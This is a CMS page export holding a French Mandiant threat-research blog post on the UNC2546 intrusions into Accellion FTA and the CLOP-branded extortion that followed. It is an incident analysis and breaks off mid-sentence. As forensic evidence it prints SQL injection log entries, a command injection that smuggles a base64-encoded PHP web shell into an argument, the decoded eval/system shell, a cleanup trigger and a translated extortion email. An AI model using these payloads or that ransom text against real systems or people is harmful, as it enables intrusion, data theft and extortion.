{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "admin",
  "jcr:created": "Fri Jul 16 2021 19:28:21 GMT+0000",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "admin",
    "jcr:title": "Vol de donn\u00e9es et extorsion\u00a0: les cybercriminels exploitent Accellion FTA",
    "jcr:versionHistory": "da618b2e-adad-41dc-86e3-54d9330e8169",
    "author": "Andrew Moore",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "jcr:lastModifiedBy": "lynda.hall@fireeye.com",
    "jcr:language": "fr_FR",
    "jcr:predecessors": [
      "176728e3-1ccb-4ac1-b284-364d83821c2a"
    ],
    "jcr:created": "Fri Jul 16 2021 19:28:21 GMT+0000",
    "cq:lastModified": "Fri Jul 16 2021 18:15:02 GMT+0000",
    "jcr:baseVersion": "176728e3-1ccb-4ac1-b284-364d83821c2a",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-blog-authors:andrew-moore",
      "fireeye-blog-authors:genevieve-stark",
      "fireeye-blog-authors:isif-ibrahima",
      "fireeye-blog-authors:van-ta",
      "fireeye-blog-threat-research:threat-research",
      "fireeye-blog-tags:homepage-carousel",
      "fireeye-blog-tags:latest",
      "fireeye-blog-tags:data-theft",
      "fireeye-blog-tags:mandiant",
      "fireeye-blog-tags:vulnerabilities",
      "fireeye-blog-tags:unc",
      "fireeye-blog-tags:ransomware",
      "fireeye-blog-tags:extortion",
      "fireeye-blog-authors:kimberly-goody"
    ],
    "jcr:lastModified": "Fri Jul 16 2021 18:15:02 GMT+0000",
    "jcr:uuid": "0cc9e21b-dd58-4d75-b0a5-5e7418106dcd",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Mon Feb 22 2021 06:00:00 GMT-0800",
    "cq:lastModifiedBy": "lynda.hall@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "lynda.hall@fireeye.com",
        "text": "\u003Cp\u003EDepuis la mi-d\u00e9cembre\u00a02020, le groupe d\u0027attaque UNC2546 (nom de code donn\u00e9 par Mandiant) a exploit\u00e9 plusieurs vuln\u00e9rabilit\u00e9s zero-day d\u0027une ancienne version d\u0027Accellion FTA (File Transfer Appliance) afin d\u0027installer DEWMODE, un web shell inconnu jusqu\u0027alors. Il aura fallu attendre la fin du mois de janvier\u00a02021 pour d\u00e9couvrir les vraies motivations d\u0027UNC2546, lorsque plusieurs entreprises cibl\u00e9es en d\u00e9cembre ont re\u00e7u des e-mails de chantage les mena\u00e7ant de publier des donn\u00e9es vol\u00e9es sur le site .onion de shaming appel\u00e9 \u201cCL0P^_- LEAKS\u0026quot;. Certaines des donn\u00e9es publi\u00e9es sur ce site ont effectivement \u00e9t\u00e9 subtilis\u00e9es \u00e0 l\u0027aide du web shell DEWMODE.\u003C\/p\u003E\n\u003Cp\u003ENotons par ailleurs que le nombre de victimes expos\u00e9es publiquement sur \u201cCL0P^_- LEAKS\u0026quot; a augment\u00e9 en f\u00e9vrier\u00a02021, les donn\u00e9es publi\u00e9es provenant notamment d\u0027entreprises implant\u00e9es aux \u00c9tats-Unis, \u00e0 Singapour, au Canada et aux Pays-Bas. Dans une note s\u00e9par\u00e9e, Mandiant avait d\u00e9j\u00e0 signal\u00e9 que \u003Ca href=\u0022\/content\/fireeye-www\/en_US\/blog\/threat-research\/2020\/10\/fin11-email-campaigns-precursor-for-ransomware-data-theft.html\u0022 adhocenable=\u0022false\u0022\u003Ele groupe d\u0027attaque FIN11 avait menac\u00e9 de publier des donn\u00e9es vol\u00e9es\u003C\/a\u003E sur ce m\u00eame site .onion afin de faire pression sur les victimes de son ransomware CLOP. Toutefois, au cours de tentatives d\u0027extorsion CLOP r\u00e9centes, aucun ransomware n\u0027a \u00e9t\u00e9 d\u00e9ploy\u00e9 et aucun autre indicateur de compromission propre \u00e0 FIN11 n\u0027a \u00e9t\u00e9 d\u00e9tect\u00e9.\u003C\/p\u003E\n\u003Cp\u003ENous enqu\u00eatons actuellement sur les cas d\u0027exploitation des vuln\u00e9rabilit\u00e9s zero-day d\u0027Accellion FTA et les vols de donn\u00e9es d\u0027entreprises utilisatrices de l\u0027ancien produit FTA sous le nom de code UNC2546. Les activit\u00e9s d\u0027extorsion qui s\u0027ensuivent, elles, sont investigu\u00e9es sous la d\u00e9nomination UNC2582. \u00c0 cet \u00e9gard, nous avons identifi\u00e9 des points communs entre UNC2582, UNC2546 et d\u0027anciennes op\u00e9rations de FIN11. Cependant, nos travaux de recherche des relations entre ces clusters d\u0027activit\u00e9 sont encore en cours. Pour en savoir plus sur notre utilisation des d\u00e9signations \u00ab\u00a0UNC\u00a0\u00bb, lisez notre article de blog intitul\u00e9 \u0026quot;\u003Ca href=\u0022\/content\/fireeye-www\/en_US\/blog\/products-and-services\/2020\/12\/how-mandiant-tracks-uncategorized-threat-actors.html\u0022 adhocenable=\u0022false\u0022\u003EDebUNCing Attribution: How Mandiant Tracks Uncategorized Threat Actors\u003C\/a\u003E.\u0026quot;\u003C\/p\u003E\n\u003Cp\u003EMandiant travaille en \u00e9troite collaboration avec Accellion sur ce sujet et produira un bilan de s\u00e9curit\u00e9 complet dans les prochaines semaines. Au moment o\u00f9 nous \u00e9crivons cet article, \u003Ca href=\u0022https:\/\/www.accellion.com\/company\/press-releases\/accellion-provides-update-to-recent-fta-security-incident\/\u0022\u003EAccellion a corrig\u00e9 toutes les vuln\u00e9rabilit\u00e9s FTA\u003C\/a\u003E connues et exploitables, tout en ajoutant de nouvelles fonctionnalit\u00e9s d\u0027alerte et de surveillance pour le signalement des anomalies associ\u00e9es \u00e0 ces vecteurs d\u0027attaque. De son c\u00f4t\u00e9, Mandiant a valid\u00e9 ces correctifs. Nous r\u00e9alisons actuellement des tests d\u0027intrusion et une analyse du code de la version actuelle d\u0027Accellion FTA. Jusqu\u0027ici, nous n\u0027avons identifi\u00e9 aucune autre faille critique dans ce produit. L\u0027attaque a touch\u00e9 les clients Accellion qui utilisent l\u0027ancienne version de FTA.\u003C\/p\u003E\n\u003Cp\u003EAccellion FTA est un produit en fin de vie lanc\u00e9 il y a 20\u00a0ans. L\u0027\u00e9diteur recommande fortement \u00e0 ses clients \u003Ca href=\u0022https:\/\/www.accellion.com\/products\/fta\/\u0022\u003Ede migrer vers Kiteworks\u003C\/a\u003E, sa plateforme \u003Ca href=\u0022https:\/\/www.accellion.com\/\u0022\u003EEnterprise Content Firewall\u003C\/a\u003E. D\u0027apr\u00e8s Accellion, Kiteworks repose sur un codebase compl\u00e8tement diff\u00e9rent.\u003C\/p\u003E\n\u003Cp\u003ELes identifiants CVE suivants sont d\u00e9sormais utilis\u00e9s pour traquer les vuln\u00e9rabilit\u00e9s r\u00e9cemment corrig\u00e9es d\u0027Accellion FTA\u00a0:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2021-27101\u0022\u003ECVE-2021-27101\u003C\/a\u003E \u2013 injection SQL via un en-t\u00eate d\u0027h\u00f4te sp\u00e9cialement con\u00e7u\u003C\/li\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2021-27102\u0022\u003ECVE-2021-27102\u003C\/a\u003E \u2013 ex\u00e9cution de commande OS via un appel de service web local\u003C\/li\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2021-27103\u0022\u003ECVE-2021-27103\u003C\/a\u003E \u2013 SSRF via une requ\u00eate POST sp\u00e9cialement con\u00e7ue\u003C\/li\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2021-27104\u0022\u003ECVE-2021-27104\u003C\/a\u003E \u2013 ex\u00e9cution de commande OS via une requ\u00eate POST sp\u00e9cialement con\u00e7ue\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch4\u003EUNC2546 et DEWMODE\u003C\/h4\u003E\n\u003Cp\u003E\u00c0 la mi-d\u00e9cembre\u00a02020, Mandiant est intervenu sur de multiples incidents au cours desquels un web shell baptis\u00e9 DEWMODE a servi \u00e0 exfiltrer des donn\u00e9es des produits Accellion FTA. Accellion FTA est une application d\u0027entreprise sp\u00e9cialement con\u00e7ue pour le transfert s\u00e9curis\u00e9 de gros fichiers. Ces activit\u00e9s d\u0027exfiltration ont touch\u00e9 de nombreux secteurs et pays.\u003C\/p\u003E\n\u003Cp\u003EMandiant a constat\u00e9 des points communs entre ces incidents sur le plan du mode op\u00e9ratoire et de l\u0027infrastructure utilis\u00e9e, notamment l\u0027exploitation de FTA pour d\u00e9ployer le web shell DEWMODE. Nous en avons conclu qu\u0027un seul et m\u00eame groupe d\u0027attaque, que nos services ont nomm\u00e9 UNC2546, \u00e9tait \u00e0 l\u0027origine de ces activit\u00e9s. Bien que l\u0027analyse de tous les d\u00e9tails des vuln\u00e9rabilit\u00e9s exploit\u00e9es pour installer DEWMODE soit toujours en cours, les preuves r\u00e9unies lors de multiples investigations clients ont d\u00e9j\u00e0 permis de rep\u00e9rer plusieurs similitudes entre les diff\u00e9rentes activit\u00e9s d\u0027UNC2546.\u003C\/p\u003E\n\u003Ch4\u003EPreuves d\u0027exploitation et installation de DEWMODE\u003C\/h4\u003E\n\u003Cp\u003EEn examinant les logs syst\u00e8me et Apache des \u00e9quipements touch\u00e9s, Mandiant est parvenu \u00e0 reconstituer une bonne partie de la cha\u00eene de compromission d\u0027Accellion FTA \u2013 de la compromission initiale \u00e0 la tentative d\u0027extorsion, en passant par le d\u00e9ploiement de DEWMODE.\u003C\/p\u003E\n\u003Cp\u003EC\u0027est \u00e0 la mi-d\u00e9cembre que nous avons commenc\u00e9 \u00e0 identifier des activit\u00e9s associ\u00e9es \u00e0 cette campagne. \u00c0 l\u0027\u00e9poque, Mandiant a constat\u00e9 que le groupe UNC2546 exploitait une faille permettant d\u0027injecter du code SQL dans Accellion FTA. Cette premi\u00e8re injection SQL servait de vecteur d\u0027intrusion principal.\u003C\/p\u003E\n\u003Cp\u003EComme le montre la figure 1, Mandiant a trouv\u00e9 des signes d\u0027injection SQL suivie de requ\u00eates vers d\u0027autres ressources.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E[21\/Dec\/2020:18:14:32 +0000] [.\u0027))union(select(c_value)from(t_global)where(t_global.c_param)=(\u0027w1\u0027))#\/sid#935ee00][rid#9700968\/initial] (1) pass through \/courier\/document_root.html\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E[21\/Dec\/2020:18:14:33 +0000] [\u0027))union(select(loc_id)from(net1.servers)where(proximity)=(0))#\/sid#935ee00][rid#9706978\/initial] (1) pass through \/courier\/document_root.html\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E[21\/Dec\/2020:18:14:33 +0000] [.\u0027))union(select(reverse(c_value))from(t_global)where(t_global.c_param)=(\u0027w1\u0027))#\/sid#935ee00][rid#971c098\/initial] (1) pass through \/courier\/document_root.html\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E[21\/Dec\/2020:18:14:34 +0000] [\u0026lt;redacted\u0026gt;\/sid#935ee00][rid#971a090\/initial] (1) pass through \/courier\/sftp_account_edit.php\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E[21\/Dec\/2020:18:14:35 +0000] [\u0026lt;redacted\u0026gt;\/sid#935ee00][rid#9706978\/initial] (1) pass through \/courier\/oauth.api\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E[21\/Dec\/2020:18:14:35 +0000] [\u0026lt;redacted\u0026gt;\/sid#935ee00][rid#9708980\/initial] (1) pass through \/courier\/oauth.api\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure\u00a01\u00a0: Log d\u0027injection SQL\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EUNC2546 a exploit\u00e9 cette vuln\u00e9rabilit\u00e9 pour r\u00e9cup\u00e9rer une cl\u00e9, elle-m\u00eame utilis\u00e9e en conjonction avec une requ\u00eate vers le fichier \u003Cspan class=\u0022code\u0022\u003Esftp_account_edit.php\u003C\/span\u003E. Dans la foul\u00e9e, l\u0027utilitaire \u003Cspan class=\u0022code\u0022\u003Eadmin.pl\u003C\/span\u003E int\u00e9gr\u00e9 \u00e0 Accellion \u00e9tait ex\u00e9cut\u00e9, avec pour cons\u00e9quence la cr\u00e9ation d\u0027un web shell eval pour \u003Cspan class=\u0022code\u0022\u003Eoauth.api\u003C\/span\u003E.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cspan class=\u0022code\u0022\u003EPWD=\/home\/seos\/courier ; USER=root ; COMMAND=\/usr\/local\/bin\/admin.pl --edit_user=F \u003Cbr\u003E\n --mount_cifs=-\u003Cbr\u003E\n V,DF,$(echo${IFS}PD9waHAKCmlmKGlzc2V0KCRfUkVRVUVTVFsndG9rZW4nXSkpCnsKICAgIGV2YWwoYm\u003Cbr\u003E\n FzZTY0X2RlY29kZSgkX1JFUVVFU1RbJ3Rva2VuJ10pKTsKfQplbHNlIGlmKGlzc2V0KCRfUkVRVUVTVFsnd\u003Cbr\u003E\n XNlcm5hbWUnXSkpCnsKICAgIHN5c3RlbSgkX1JFUVVFU1RbJ3VzZXJuYW1lJ10pOwp9CmVsc2UKewogICAgaG\u003Cbr\u003E\n VhZGVyKCdMb2NhdGlvbjogLycpOwp9|base64${IFS}-d|tee${IFS}\/home\/seos\/courier\/oauth.api);FUK;\u0026quot;,PASSWORD # \\\u0026quot; --passwd=pop\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure\u00a02\u00a0: Extrait du log montrant la cr\u00e9ation du web shell eval\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EVous trouverez le contenu d\u00e9cod\u00e9 \u00e0 la figure 3.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026lt;?php\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Eif(isset($_REQUEST[\u0027token\u0027]))\u003Cbr\u003E\n {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; eval(base64_decode($_REQUEST[\u0027token\u0027]));\u003Cbr\u003E\n }\u003Cbr\u003E\n else if(isset($_REQUEST[\u0027username\u0027]))\u003Cbr\u003E\n {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; system($_REQUEST[\u0027username\u0027]);\u003Cbr\u003E\n }\u003Cbr\u003E\n else\u003Cbr\u003E\n {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; header(\u0027Location: \/\u0027);\u003Cbr\u003E\n }\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure\u00a03\u00a0: Web shell eval d\u00e9cod\u00e9\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EPresque aussit\u00f4t apr\u00e8s, le web shell DEWMODE \u00e9tait cr\u00e9\u00e9 sur le syst\u00e8me. La chronologie de ces requ\u00eates sugg\u00e8re que DEWMODE \u00e9tait install\u00e9 via le web shell\u0026nbsp;\u003Cspan class=\u0022code\u0022\u003Eoauth.api\u003C\/span\u003E\u0026nbsp;. Toutefois, rien n\u0027indique pr\u00e9cis\u00e9ment le m\u00e9canisme utilis\u00e9 pour enregistrer DEWMODE sur le disque.\u003C\/p\u003E\n\u003Cp\u003ELe web shell DEWMODE se trouvait dans l\u0027un des deux emplacements suivants\u00a0:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003E\/home\/seos\/courier\/about.html\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003E\/home\/httpd\/html\/about.html\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EComme le montre la figure 4, il extrayait une liste de fichiers disponibles \u00e0 partir d\u0027une base de donn\u00e9es MySQL sur FTA et listait ces fichiers et leurs m\u00e9tadonn\u00e9es \u2013 ID de fichier, chemin, nom de fichier, auteur de l\u0027upload et destinataire \u2013 sur une page HTML. Ensuite, UNC2546 utilisait cette liste pour t\u00e9l\u00e9charger les fichiers via le web shell DEWMODE. Les requ\u00eates de t\u00e9l\u00e9chargement figurent dans les logs web de FTA, qui contiendront les requ\u00eates au web shell DEWMODE dont les param\u00e8tres d\u0027URL sont chiffr\u00e9s et encod\u00e9s, \u00ab\u00a0dwn\u00a0\u00bb \u00e9tant le chemin du fichier demand\u00e9 et \u00ab\u00a0fn\u00a0\u00bb \u00e9tant son nom (cf. Figure 5). Ces deux valeurs chiffr\u00e9es visibles dans les logs web peuvent \u00eatre d\u00e9chiffr\u00e9es \u00e0 l\u0027aide de la cl\u00e9 obtenue \u00e0 partir de la base de donn\u00e9es utilis\u00e9e par l\u0027instance FTA infect\u00e9e. Compte tenu de la complexit\u00e9 de ce processus, n\u0027h\u00e9sitez pas \u00e0 contacter Mandiant ou Accellion pour l\u0027examen des logs concern\u00e9s.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/accellion-fta\/fig4.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure\u00a04\u00a0: Copie d\u0027\u00e9cran du web shell DEWMODE\u003C\/span\u003E\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cspan class=\u0022code\u0022\u003EGET \/courier\/about.html?dwn=[REDACTED]\u0026amp;fn=[REDACTED] HTTP\/1.1\u0026quot; 200 1098240863 \u0026quot;-\u0026quot; \u0026quot;-\u0026quot; \u0026quot;-\u0026quot; TLSv1.2 ECDHE-RSA-AES128-SHA256\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure\u00a05\u00a0: Param\u00e8tres d\u0027URL de t\u00e9l\u00e9chargement de fichier DEWMODE\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EUne fois les fichiers t\u00e9l\u00e9charg\u00e9s, UNC2546 lan\u00e7ait une proc\u00e9dure de nettoyage en envoyant un param\u00e8tre de requ\u00eate sp\u00e9cifique nomm\u00e9 \u003Cspan class=\u0022code\u0022\u003Ecsrftoken\u003C\/span\u003E, avec la valeur \u003Cspan class=\u0022code\u0022\u003E11454bd782bb41db213d415e10a0fb3c\u003C\/span\u003E, \u00e0 DEWMODE. Ce param\u00e8tre d\u00e9clenchait les actions suivantes\u00a0:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EEnregistrement d\u0027un script shell dans \u003Cspan class=\u0022code\u0022\u003E\/tmp\/.scr\u003C\/span\u003E\u00a0:\u003Cul\u003E\n\u003Cli\u003ESuppression de toute r\u00e9f\u00e9rence \u00e0 \u003Cspan class=\u0022code\u0022\u003Eabout.html\u003C\/span\u003E dans les logs du r\u00e9pertoire \u003Cspan class=\u0022code\u0022\u003E\/var\/opt\/apache\/\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003EEnregistrement du log modifi\u00e9 dans \u003Cspan class=\u0022code\u0022\u003E\/tmp\/x\u003C\/span\u003E et remplacement du log original dans \u003Cspan class=\u0022code\u0022\u003E\/var\/opt\/apache\/\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003ESuppression des contenus du log \u003Cspan class=\u0022code\u0022\u003E\/home\/seos\/log\/adminpl.log\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003ESuppression de \u003Cspan class=\u0022code\u0022\u003E\/home\/seos\/courier\/about.html\u003C\/span\u003E (DEWMODE) et \u003Cspan class=\u0022code\u0022\u003E\/home\/seos\/courier\/oauth.api\u003C\/span\u003E (web shell eval), et redirection des sorties de commande vers le fichier \u003Cspan class=\u0022code\u0022\u003E\/tmp\/.out\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003EModification des autorisations li\u00e9es au fichier de sortie pour le rendre accessible en lecture\/\u00e9criture et ex\u00e9cutable par tous les utilisateurs, sans oublier d\u0027effacer tout nom de propri\u00e9taire\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003ESuppression du fichier de script \u003Cspan class=\u0022code\u0022\u003E\/tmp\/.scr\u003C\/span\u003E et d\u0027autres fichiers temporaires cr\u00e9\u00e9s pour la proc\u00e9dure de nettoyage\u003C\/li\u003E\n\u003Cli\u003EAffichage des donn\u00e9es de sortie pour l\u0027utilisateur ayant lanc\u00e9 la proc\u00e9dure\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EVous trouverez un exemple de requ\u00eate de nettoyage et d\u0027ex\u00e9cution du script associ\u00e9 \u00e0 la figure 6.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003EGET \/courier\/about.html?csrftoken=11454bd782bb41db213d415e10a0fb3c HTTP\/1.1\u0026quot; 200 5 \u0026quot;-\u0026quot; \u0026quot;https:\/\/[MASQU\u00c9]\/\/courier\/about.html?aid=1000\u0026quot; \u0026quot;Mozilla\/5.0 (X11; Linux x86_64; rv:82.0) Gecko\/20100101\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Esft sudo:\u0026nbsp;\u0026nbsp; nobody : TTY=unknown ; PWD=\/home\/seos\/courier ; USER=root ; COMMAND=\/usr\/local\/bin\/admin.pl --mount_cifs=AF,DF,\u0027$(sh \/tmp\/.scr)\u0027,PASSWORD\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure\u00a06\u00a0: Requ\u00eate de nettoyage DEWMODE\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EMandiant a \u00e9galement identifi\u00e9 une variante de DEWMODE (\u003Cspan class=\u0022code\u0022\u003Ebdfd11b1b092b7c61ce5f02ffc5ad55a\u003C\/span\u003E) dont la proc\u00e9dure de nettoyage \u00e9tait l\u00e9g\u00e8rement diff\u00e9rente. En effet, elle ordonnait l\u0027effacement de \u003Cspan class=\u0022code\u0022\u003E\/var\/log\/secure\u003C\/span\u003E et la suppression de \u003Cspan class=\u0022code\u0022\u003Eabout.html\u003C\/span\u003E et de \u003Cspan class=\u0022code\u0022\u003Eoauth.api\u003C\/span\u003E des r\u00e9pertoires \u003Cspan class=\u0022code\u0022\u003E\/home\/httpd\/html\/\u003C\/span\u003E au lieu de \u003Cspan class=\u0022code\u0022\u003E\/home\/seos\/courier\/\u003C\/span\u003E.\u003Cb\u003E\u003C\/b\u003E\u003C\/p\u003E\n\u003Cp\u003ELors de certains incidents, nous avons \u00e9galement constat\u00e9 qu\u0027UNC2546 r\u00e9cup\u00e9rait un fichier nomm\u00e9 \u003Cspan class=\u0022code\u0022\u003Ecache.js.gz\u003C\/span\u003E (cf. Figure 7). Compte tenu de la chronologie des acc\u00e8s \u00e0 l\u0027utilitaire \u003Cspan class=\u0022code\u0022\u003Emysqldump\u003C\/span\u003E et aux r\u00e9pertoires \u003Cspan class=\u0022code\u0022\u003Emysql\u003C\/span\u003E, le fichier compress\u00e9 contenait probablement un dump de la base de donn\u00e9es. \u00c0 l\u0027exception de \u003Cspan class=\u0022code\u0022\u003Ecache.js.gz\u003C\/span\u003E, Mandiant n\u0027a constat\u00e9 aucune r\u00e9cup\u00e9ration de fichiers des instances d\u0027Accellion par un autre moyen que DEWMODE.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cspan class=\u0022code\u0022\u003EGET \/\/courier\/cache.js.gz HTTP\/1.1\u0026quot; 200 35654360 \u0026quot;-\u0026quot; \u0026quot;-\u0026quot; \u0026quot;python-requests\/2.24.0\u0026quot; TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 7: R\u00e9cup\u00e9ration du fichier cache.js.gz\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EUNC2582\u00a0: vol de donn\u00e9es et extorsion\u003C\/h4\u003E\n\u003Cp\u003EPeu apr\u00e8s l\u0027installation du web shell, souvent au bout de quelques heures seulement, UNC2546 exploitait DEWMODE pour t\u00e9l\u00e9charger des fichiers des instances FTA compromises. Si les motivations des attaquants n\u0027\u00e9taient pas claires au d\u00e9part, plusieurs semaines apr\u00e8s l\u0027installation du web shell DEWMODE, les victimes recevaient un e-mail d\u0027extorsion d\u0027un hacker soi-disant membre de l\u0027\u00e9quipe du ransomware CLOP (cf. Figures 8 et 9). Les attaquants mena\u00e7aient de publier les donn\u00e9es vol\u00e9es sur le site de shaming .onion \u0026quot;CL0P^_- LEAKS\u0026quot; afin de porter pr\u00e9judice aux victimes si elles ne leur versaient pas la somme demand\u00e9e. De notre c\u00f4t\u00e9, nous traquons ces activit\u00e9s d\u0027extorsion comme un cluster s\u00e9par\u00e9, nom de code UNC2582. Toutefois, nous avons identifi\u00e9 au moins un cas o\u00f9 l\u0027attaquant interagissait avec le web shell DEWMODE d\u0027un h\u00f4te utilis\u00e9 pour envoyer un e-mail de chantage attribu\u00e9 \u00e0 UNC2582.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EBonjour,\u003C\/p\u003E\n\u003Cp\u003ENous avons pirat\u00e9 votre r\u00e9seau et vol\u00e9 une grande quantit\u00e9 de donn\u00e9es importantes. \u0026lt;description of stolen data, including the total size of the compressed files\u0026gt; Nous appartenons \u00e0 l\u0027\u00e9quipe du ransomware CLOP. Si vous cherchez sur Google, vous trouverez des infos et des articles nous concernant. Nous avons un site web sur lequel nous publions de l\u0027actu et des fichiers vol\u00e9s \u00e0 des entreprises qui ont refus\u00e9 de coop\u00e9rer. Voici l\u0027adresse\u00a0: http:\/\/[masqu\u00e9].onion\/. Utilisez le navigateur TOR ou le site web miroir http:\/\/[masqu\u00e9].onion.dog\/. Chaque jour, notre site est consult\u00e9 par 20\u00a0000\u00a0\u00e0 30\u00a0000\u00a0journalistes, experts informatiques, hackers et concurrents. Nous vous conseillons de nous contacter par chat dans les 24\u00a0heures pour discuter de la situation. \u0026lt;victim-specific negotiation URL\u0026gt; Utilisez le navigateur TOR. Notre but n\u0027est pas de vous nuire, mais seulement de gagner de l\u0027argent. Nous sommes \u00e9galement pr\u00eats \u00e0 fournir des preuves d\u0027existence des fichiers en notre possession.\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure\u00a08\u00a0: Exemple n\u00b0\u00a01 de message d\u0027extorsion (traduction)\u003C\/span\u003E\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ECeci est notre dernier 